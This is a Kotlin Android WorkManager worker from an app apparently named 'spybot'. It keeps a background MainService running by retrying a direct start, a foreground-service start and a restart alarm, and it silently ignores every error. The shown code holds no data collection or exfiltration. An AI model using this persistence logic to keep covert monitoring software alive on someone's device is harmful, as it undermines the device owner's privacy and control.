package com.spybot.app.Utils

import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.spybot.app.MainService

class ServiceWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {
    override fun doWork(): Result {
        return try {
            if (!ServiceHelper.shouldServiceRun(applicationContext)) {
                return Result.success()
            }

            if (MainService.isRunning()) {
                sendHeartbeat()
                return Result.success()
            }

            val started = attemptStartService()
            if (started) {
                Result.success()
            } else {
                if (runAttemptCount >= 3) {
                    ServiceHelper.saveServiceState(applicationContext, true)
                    Result.success()
                } else {
                    Result.retry()
                }
            }
        } catch (e: Exception) {
            ServiceHelper.saveServiceState(applicationContext, true)
            Result.retry()
        }
    }

    private fun attemptStartService(): Boolean {
        try {
            MainService.start(applicationContext)
            Thread.sleep(500)
            if (MainService.isRunning()) return true
        } catch (e: Exception) {}

        try {
            val intent = Intent(applicationContext, MainService::class.java).apply {
                action = MainService.ACTION_START
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(applicationContext, intent)
            } else {
                applicationContext.startService(intent)
            }
            Thread.sleep(500)
            if (MainService.isRunning()) return true
        } catch (e: Exception) {}

        try {
            ServiceHelper.scheduleServiceRestartAlarm(applicationContext, 1000)
            return true
        } catch (e: Exception) {}

        return false
    }

    private fun sendHeartbeat() {
        try {
            val intent = Intent(applicationContext, MainService::class.java).apply {
                action = MainService.ACTION_START
            }
            applicationContext.startService(intent)
        } catch (e: Exception) {}
    }
}
